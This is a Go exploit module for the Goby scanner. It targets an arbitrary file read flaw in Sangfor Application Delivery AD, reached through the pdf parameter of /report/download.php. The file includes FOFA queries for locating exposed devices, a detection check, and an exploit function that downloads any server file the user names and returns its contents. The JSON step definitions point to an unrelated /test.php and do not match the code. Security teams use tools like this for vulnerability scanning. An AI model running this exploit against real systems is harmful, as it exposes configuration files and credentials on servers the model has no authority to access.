package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sangfor AD download.php pdf file reading vulnerability",
    "Description": "<p>Sangfor Application Delivery AD realizes real-time monitoring of the status of each data center, link and server, and allocates user access requests to the corresponding data center, link and server according to preset rules.</p><p>There is an arbitrary file reading vulnerability in the /report/download.php file of Sangfor Application Delivery AD 3.8. By passing in the ?pdf parameter, an attacker can download any file in the server and leak sensitive information on the server.</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a></p>",
    "Product": "SANGFOR-App-Delivery-MS",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "深信服应用交付报表系统 download.php pdf 文件读取漏洞",
            "Product": "SANGFOR-应用交付管理系统",
            "Description": "<p>深信服应用交付 AD 实现了对各个数据中心、链路以及服务器状态的实时监控，并根据预设规则将用户的访问请求分配给相应的数据中心、 链路以及服务器。</p><p>深信服应用交付 AD /report/download.php 文件存在任意文件读取漏洞，攻击者通过传入 pdf 参数可以下载服务器中的任意文件，泄漏服务器敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a></p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sangfor AD download.php pdf file reading vulnerability",
            "Product": "SANGFOR-App-Delivery-MS",
            "Description": "<p>Sangfor Application Delivery AD realizes real-time monitoring of the status of each data center, link and server, and allocates user access requests to the corresponding data center, link and server according to preset rules.</p><p>There is an arbitrary file reading vulnerability in the /report/download.php file of Sangfor Application Delivery AD 3.8. By passing in the ?pdf parameter, an attacker can download any file in the server and leak sensitive information on the server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.sangfor.com.cn\">https://www.sangfor.com.cn</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(body=\"user_blur();\" && body=\"AD Report\") || title=\"ad.sangfor.com\" || title=\"AD Report\" ",
    "GobyQuery": "(body=\"user_blur();\" && body=\"AD Report\") || title=\"ad.sangfor.com\" || title=\"AD Report\" ",
    "Author": " 1171373465@qq.com",
    "Homepage": "https://www.sangfor.com.cn/",
    "DisclosureDate": "2022-03-23",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "./download.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.0",
    "PostTime": "2023-09-14",
    "PocId": "10262"
}`

	sendPaylaod0f7f6786 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/report/download.php?pdf=" + url.QueryEscape(filename))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPaylaod0f7f6786(u, `./download.php`)
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "<?php")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filePath"])
			rsp, err := sendPaylaod0f7f6786(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if rsp.Utf8Html == "" {
				expResult.Success = false
				expResult.Output = "文件内容为空或不存在，请检查文件路径是否有效"
			} else {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}
